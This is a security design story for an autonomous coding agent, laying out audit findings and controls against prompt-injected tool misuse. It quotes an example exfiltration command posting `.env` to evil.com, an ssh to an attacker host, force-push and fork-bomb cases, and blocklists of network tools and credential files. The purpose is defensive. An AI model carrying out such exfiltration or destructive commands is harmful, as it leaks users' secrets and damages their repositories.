# Story 11.6: Security Hardening v2 — Defense-in-Depth for Autonomous Tool Execution

Status: ready-for-dev

## Story

As a **security engineer**,
I want defense-in-depth controls covering output validation, credential scanning, rate limiting, audit trails, sandboxed execution, filesystem boundary enforcement, and network access controls,
so that the autonomous development system cannot be exploited for data exfiltration, credential leakage, resource exhaustion, or unauthorized access — even when the LLM is compromised via indirect prompt injection.

## Motivation

The current security layer (Stories 11.1–11.5) provides solid input sanitization, tool call validation, prompt hardening, and fail-closed guards. However, the deep audit of the implemented code reveals several gaps that an attacker could exploit in an autonomous coding agent:

### Audit Findings — Critical Gaps

1. **No output validation for data exfiltration**: The LLM can instruct tools to exfiltrate data by encoding secrets into git commit messages, file contents written to public paths, or shell commands that `curl` data to external servers. Output sanitization (`SanitizeOutput`) only strips HTML/zero-width chars — it does not scan for credentials or PII in generated content.

2. **No credential scanning in generated code**: `FileWriteTool` writes whatever the LLM produces. If the LLM hallucinates or is manipulated into embedding API keys, passwords, or tokens in generated code, they persist to disk and potentially get committed.

3. **No rate limiting per tool type**: A compromised LLM can call `shell_execute` thousands of times in rapid succession within the `maxSteps` limit (default 25). Each shell command can spawn processes, consume memory, and exhaust disk I/O. There is no per-tool-type rate limit.

4. **Incomplete audit trail**: `ToolLoopEventEmitter` emits SSE events for tool execution progress, but does NOT persist these events to a durable store. If the SSE connection drops or no consumer is active, all tool execution history is lost. There is no persistent audit log that records tool arguments, outputs, or security decisions.

5. **No sandboxed execution environment**: `ShellExecuteTool` runs commands directly on the host via `/bin/bash -c`. There is no container isolation, no cgroup resource limits, no seccomp profiles, and no filesystem mount restrictions. A single `fork bomb` bypasses the timeout.

6. **Filesystem boundary enforcement gaps**:
   - `PathValidator` correctly prevents traversal via `..` and symlink resolution. However, it does NOT block reads of sensitive files within the workspace (e.g., `.env`, `.git/config`, `id_rsa`, `*.pem`, `credentials.json`).
   - `FileWriteTool` does not block overwriting critical files (e.g., `.github/workflows/*.yml`, `Dockerfile`, `package.json` scripts, `Makefile`).
   - No file size limits on writes — LLM can write arbitrarily large files to fill disk.

7. **Network access uncontrolled**: `ShellExecuteTool` can run `curl`, `wget`, `nc`, `ssh`, or any network tool. The `ActionGate` blocks `curl | bash` but does NOT block `curl -X POST https://evil.com/exfil -d @.env` or `ssh user@attacker.com`.

8. **Git operations allow push to protected branches**: `GitOperationsTool` allows `push` as a subcommand. While it blocks shell metacharacters in args, it does not validate the target branch. An LLM could `git push origin main --force` (force push to main). The `--force` flag is just another argument token.

9. **Tool output not redacted**: `ToolOutputHelper.RedactSecrets()` exists but is NEVER called in the tool execution path. Tool outputs (which may contain secrets from file reads, env vars from shell output, or stack traces with internal paths) flow directly into the LLM conversation history without redaction.

10. **Command substitution bypass in RunTestsTool**: `RunTestsTool` builds a command by concatenating `testCommand + project + filter` and passes it to bash via `-c`. The `filter` parameter is quoted with double quotes (`--filter "{filter}"`) but this does NOT prevent backtick or `$(...)` injection within the filter string. `CommandValidator` blocks `$(` and backticks, but the check happens AFTER string concatenation — meaning the combined string may contain patterns that individual parts do not.

## Acceptance Criteria

### Output Validation & Data Exfiltration Prevention

1. A new `OutputValidator` class scans LLM-generated content (file writes, commit messages, shell commands) for embedded credentials using pattern matching (API keys, tokens, passwords, private keys, connection strings)
2. `FileWriteTool` runs content through `OutputValidator` before writing; if credentials are detected, the write is blocked and the LLM receives an error message describing the violation (without revealing the credential)
3. `GitOperationsTool` scans commit message content for credentials before allowing `commit`
4. Shell commands that include URLs with embedded credentials or data exfiltration patterns (POST/PUT to external hosts with file data) are blocked by an enhanced `ActionGate`

### Credential Scanning

5. `CredentialScanner` class detects 12+ credential patterns: AWS keys (`AKIA...`), GitHub tokens (`ghp_`, `gho_`, `ghs_`), GitLab tokens (`glpat-`), Anthropic keys (`sk-ant-`), OpenAI keys (`sk-`), generic API keys, private key blocks (`-----BEGIN`), connection strings with passwords, JWT tokens, base64-encoded secrets, `.env` variable assignments, and bearer tokens
6. Scanner is used by both `OutputValidator` (for LLM output) and tool output redaction (for file read results flowing back to LLM)

### Rate Limiting

7. `ToolRateLimiter` enforces per-tool-type rate limits within a sliding window (configurable, default: `shell_execute` 10/minute, `file_write` 30/minute, `git_operations` 20/minute, `run_tests` 5/minute)
8. Rate limits are checked before tool execution in `CallLlmInlineActivity`; exceeded limits return an error to the LLM ("Rate limit exceeded for tool X, try again after Y seconds")
9. Cumulative execution time limit per tool loop session (configurable, default: 10 minutes total shell execution time)

### Persistent Audit Trail

10. `ToolExecutionAuditLogger` persists every tool execution to a durable store (database table or append-only log file) with: timestamp, workflow instance ID, turn number, tool name, tool call ID, argument hash (not raw args), success/failure, duration, output size, and any security decisions (blocked, rate-limited, credential-detected)
11. Audit log is write-only and append-only — no delete or update operations
12. Security-relevant events (blocked commands, credential detections, rate limit hits, path traversal attempts) are logged at WARN level with structured fields for alerting

### Sandboxed Execution

13. `ShellExecuteTool` supports an optional sandbox mode that executes commands inside a container or cgroup-limited process (Linux only; graceful degradation to direct execution on unsupported platforms)
14. Sandbox limits: configurable max memory (default 512MB), max CPU time (default 60s), max PIDs (default 100), max file descriptors (default 256), no network access (configurable)
15. When sandbox is unavailable, a resource-limited fallback uses `ulimit` to set process limits before command execution

### Filesystem Boundary Enforcement

16. `SensitiveFileGuard` maintains a configurable blocklist of file patterns that cannot be read: `*.env`, `*.pem`, `*.key`, `id_rsa*`, `credentials.json`, `secrets.yaml`, `.git/config`, `*.p12`, `*.pfx`, `*.jks`
17. `CriticalFileGuard` maintains a configurable blocklist of file patterns that cannot be written/overwritten: `.github/workflows/*`, `Dockerfile*`, `docker-compose*`, `Makefile`, `*.sh` (in root), `.gitignore`, `.npmrc`, `.yarnrc`, CI config files
18. File write size limit: configurable max (default 1MB per write, 50MB cumulative per session)
19. Both guards are configurable via `IOptions` with project-level overrides

### Network Access Controls

20. Enhanced `ActionGate` blocks outbound data exfiltration patterns: `curl -d`, `curl --data`, `wget --post-data`, `curl -F` (file upload), `scp`, `rsync` to external hosts, `ssh` commands, `nc` (netcat) connections
21. Configurable network allowlist: only specific domains/IPs can be contacted by shell commands (default: empty = all blocked when in strict mode)
22. Network control is opt-in via configuration (default: warn-only mode; strict mode blocks)

### Git Safety

23. `GitOperationsTool` blocks `push --force`, `push -f`, `push --delete`, `branch -D`, `branch --delete`, `reset --hard` (when targeting remote-tracking branches), and `checkout --` (destructive discard)
24. Protected branch configuration: list of branch name patterns that cannot be pushed to directly (default: `main`, `master`, `release/*`, `production`)

## Technical Context

### Architecture

All new security code follows the existing pattern in `Tamma.Activities/Security/`:

```
Security/
  IOutputValidator.cs           -- interface
  OutputValidator.cs             -- credential + exfiltration scanning in LLM output
  CredentialScanner.cs           -- 12+ credential pattern detection
  IToolRateLimiter.cs            -- interface
  ToolRateLimiter.cs             -- sliding window rate limiter per tool type
  ISensitiveFileGuard.cs         -- interface
  SensitiveFileGuard.cs          -- blocklist for file reads
  CriticalFileGuard.cs           -- blocklist for file writes
  ToolExecutionAuditLogger.cs    -- persistent audit trail
  SandboxOptions.cs              -- sandbox configuration
  NetworkAccessOptions.cs        -- network control configuration
  GitSafetyValidator.cs          -- git operation safety checks
```

### Integration Points

- `CallLlmInlineActivity.AgenticToolLoop()` — rate limiting before tool dispatch, audit logging after tool completion, output validation on LLM responses
- `FileReadTool.ExecuteAsync()` — sensitive file guard before read, credential redaction in output
- `FileWriteTool.ExecuteAsync()` — critical file guard + credential scanner before write, file size limit enforcement
- `ShellExecuteTool.ExecuteAsync()` — sandbox execution, network access validation, enhanced action gate
- `GitOperationsTool.ExecuteAsync()` — git safety validator, protected branch checks
- `RunTestsTool.ExecuteAsync()` — output redaction, timeout enforcement
- `ToolOutputHelper.Truncate()` — integrate `RedactSecrets()` call (currently defined but never invoked)

### Configuration

```json
{
  "Security": {
    "OutputValidation": {
      "Enabled": true,
      "BlockOnCredentialDetection": true,
      "WarnOnlyMode": false
    },
    "RateLimits": {
      "shell_execute": { "MaxPerMinute": 10 },
      "file_write": { "MaxPerMinute": 30 },
      "git_operations": { "MaxPerMinute": 20 },
      "run_tests": { "MaxPerMinute": 5 },
      "MaxCumulativeShellTimeSeconds": 600
    },
    "FileGuards": {
      "SensitiveReadPatterns": ["*.env", "*.pem", "*.key", "id_rsa*", "credentials.json", "secrets.yaml"],
      "CriticalWritePatterns": [".github/workflows/*", "Dockerfile*", "Makefile"],
      "MaxWriteSizeBytes": 1048576,
      "MaxCumulativeWriteSizeBytes": 52428800
    },
    "Sandbox": {
      "Enabled": false,
      "MaxMemoryMB": 512,
      "MaxCpuSeconds": 60,
      "MaxPids": 100,
      "MaxFds": 256,
      "AllowNetwork": false
    },
    "NetworkAccess": {
      "StrictMode": false,
      "AllowedDomains": [],
      "BlockedPatterns": ["curl -d", "curl --data", "scp ", "rsync ", "ssh "]
    },
    "GitSafety": {
      "ProtectedBranchPatterns": ["main", "master", "release/*", "production"],
      "BlockForcePush": true,
      "BlockBranchDelete": true
    },
    "AuditLog": {
      "Enabled": true,
      "LogFilePath": "/var/log/tamma/tool-audit.jsonl",
      "RetentionDays": 90
    }
  }
}
```

## Dependencies

- Story 11.1 (ContentSanitizer — already implemented)
- Story 11.3 (ToolCallValidator — already implemented)
- Story 11.5 (ActionGate, ProviderAllowlist — already implemented)
- Story 12.1 (IToolExecutor, IToolExecutorRegistry — already implemented)
- Story 12.2 (AgenticToolLoop — already implemented)

## Testing Strategy

### Unit Tests (35+)

**CredentialScanner (12 tests)**:
- Detects AWS access key (`AKIA[A-Z0-9]{16}`)
- Detects GitHub PAT (`ghp_[A-Za-z0-9]{36}`)
- Detects GitLab PAT (`glpat-[A-Za-z0-9-]{20}`)
- Detects Anthropic key (`sk-ant-[A-Za-z0-9-]+`)
- Detects OpenAI key (`sk-[A-Za-z0-9]{20,}`)
- Detects private key block (`-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----`)
- Detects connection string with password (`password=`, `pwd=`)
- Detects JWT token (`eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.`)
- Detects `.env` assignment (`SECRET_KEY=abc123`)
- Does NOT false-positive on normal code containing `key` or `password` as variable names
- Does NOT false-positive on `sk-` in comments or documentation text
- Handles multi-line input with mixed content

**OutputValidator (8 tests)**:
- Blocks file write containing embedded API key
- Blocks commit message containing private key block
- Blocks shell command exfiltrating `.env` via curl
- Allows normal code that references `apiKey` as a variable name
- Returns specific error message without revealing the detected credential
- Handles null/empty input gracefully
- Configurable warn-only mode logs but does not block
- Performance: validates 100KB content in under 5ms

**ToolRateLimiter (6 tests)**:
- Allows requests within limit
- Blocks requests exceeding per-minute limit
- Sliding window expires old entries
- Independent limits per tool type
- Cumulative time limit enforcement
- Thread-safe concurrent access

**SensitiveFileGuard (5 tests)**:
- Blocks read of `.env` file
- Blocks read of `id_rsa` file
- Allows read of normal source files
- Configurable additional patterns
- Case-insensitive matching

**CriticalFileGuard (4 tests)**:
- Blocks write to `.github/workflows/ci.yml`
- Blocks write to `Dockerfile`
- Allows write to normal source files
- File size limit enforcement

**GitSafetyValidator (6 tests)**:
- Blocks `push --force` / `push -f`
- Blocks `push --delete`
- Blocks `branch -D` / `branch --delete`
- Blocks push to protected branch `main`
- Allows push to feature branch
- Allows force push when explicitly configured

**ToolExecutionAuditLogger (4 tests)**:
- Persists tool execution record with all required fields
- Logs security events at WARN level
- Append-only (no delete API)
- Handles write failures gracefully (does not crash tool execution)

### Integration Tests (5+)

- End-to-end: LLM generates code with embedded API key -> FileWriteTool blocks write -> error fed back to LLM
- End-to-end: LLM tries git push --force to main -> GitOperationsTool blocks -> error fed back to LLM
- End-to-end: LLM floods shell_execute -> rate limiter triggers -> error fed back to LLM
- End-to-end: LLM reads `.env` via file_read -> SensitiveFileGuard blocks -> error fed back to LLM
- Audit trail: tool execution produces complete audit log entry with all fields populated

## Estimation

**Size**: XL (5-7 days)
**Risk**: Medium — introduces new validation in hot paths; performance regression testing required
**Confidence**: High — all patterns well-understood, existing code provides clear integration points

## Out of Scope

- Full container sandboxing with Docker/Podman (deferred to dedicated infrastructure story)
- Real-time credential scanning in streamed LLM output (only final output scanned)
- DLP (Data Loss Prevention) integration with external services
- Per-repository security configuration via `.tamma-security.yml` (deferred)
